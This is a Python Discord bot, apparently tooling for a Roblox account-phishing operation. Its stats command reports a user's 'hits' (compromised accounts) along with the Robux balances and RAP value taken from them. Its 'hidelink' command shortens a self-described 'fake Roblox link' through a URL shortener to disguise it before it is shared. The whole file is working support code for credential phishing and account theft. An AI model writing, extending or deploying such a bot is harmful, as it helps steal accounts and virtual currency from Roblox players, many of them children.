import discord
import requests
import aiohttp
import asyncio
from discord import app_commands
from discord.ext import commands
from datetime import datetime, timezone
from urllib.parse import quote

from server import keep_alive  # <-- IMPORTANT pentru Render
keep_alive()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=intents)

def format_number(number):
    if not isinstance(number, (int, float)):
        return 'N/A'
    if number >= 1_000_000_000:
        return f"{number / 1_000_000_000:.2f}".rstrip('0').rstrip('.') + "B"
    elif number >= 1_000_000:
        return f"{number / 1_000_000:.2f}".rstrip('0').rstrip('.') + "M"
    else:
        return f"{int(number):,}"

async def fetch_with_retries(session, url, max_retries=3, backoff_factor=2):
    for attempt in range(max_retries):
        async with session.get(url) as response:
            if response.status == 200:
                return await response.json()
            elif response.status == 429:
                retry_after = int(response.headers.get("Retry-After", 1))
                await asyncio.sleep(retry_after * backoff_factor)
            else:
                return None
    return None

async def shorten_url(url):
    api_url = f"https://is.gd/create.php?format=simple&url={quote(url)}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                return await response.text() if response.status == 200 else None
        except:
            return None

@bot.command()
async def stats(ctx, user: discord.Member = None):
    target_id = user.id if user else ctx.author.id
    url = f"https://api.injuries.lu/v1/public/user?userId={target_id}"

    async with aiohttp.ClientSession() as session:
        data = await fetch_with_retries(session, url)
    if data is None:
        data = {}

    profile = data.get("Profile", {})
    embed = discord.Embed(title="─── INFO ───", color=discord.Color.from_str("#A9A9A9"))

    if profile.get("avatarUrl"):
        embed.set_author(name=profile.get("userName", "Unknown User"))
        embed.set_thumbnail(url=profile["avatarUrl"])

    for key, header in [("Normal", "Normal Stats")]:
        section = data.get(key, {})
        if section:
            totals = section.get("Totals", {})
            highest = section.get("Highest", {})
            embed.add_field(name=header, value="\u200b", inline=False)

            embed.add_field(
                name="Total Stats",
                value=(
                    f"Hits: **{format_number(totals.get('Accounts', 0))}**\n"
                    f"Visits: **{format_number(totals.get('Visits', 0))}**\n"
                    f"Clicks: **{format_number(totals.get('Clicks', 0))}**"
                ), inline=False)

            embed.add_field(
                name="Biggest Hits",
                value=(
                    f"Summary: **{format_number(highest.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(highest.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(highest.get('Balance', 0))}**"
                ), inline=False)

            embed.add_field(
                name="Total Hits",
                value=(
                    f"Summary: **{format_number(totals.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(totals.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(totals.get('Balance', 0))}**"
                ), inline=False)

    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    embed.timestamp = datetime.now(timezone.utc)
    await ctx.send(embed=embed)

@bot.tree.command(name="hidelink", description="Hide your fake Roblox link")
@app_commands.describe(url="The fake Roblox link")
async def hidelink(interaction: discord.Interaction, url: str):

    await interaction.response.defer(ephemeral=True)

    if not any(keyword in url for keyword in ["/games", "/user", "/communities"]):
        return await interaction.followup.send("**ERROR: Not a Roblox link.**", ephemeral=True)

    short_url = await shorten_url(url)

    if not short_url:
        return await interaction.followup.send("Failed to shorten the URL.", ephemeral=True)

    try:
        await interaction.user.send(short_url)
        await interaction.followup.send("✅ Check your DMs!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("Enable DMs and try again.", ephemeral=True)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Slash commands synced GLOBAL")
    except Exception as e:
        print(f"❌ Sync failed: {e}")

# --- RUN BOT ---
import os
TOKEN = os.getenv("DISCORD_TOKEN")
bot.run(TOKEN)
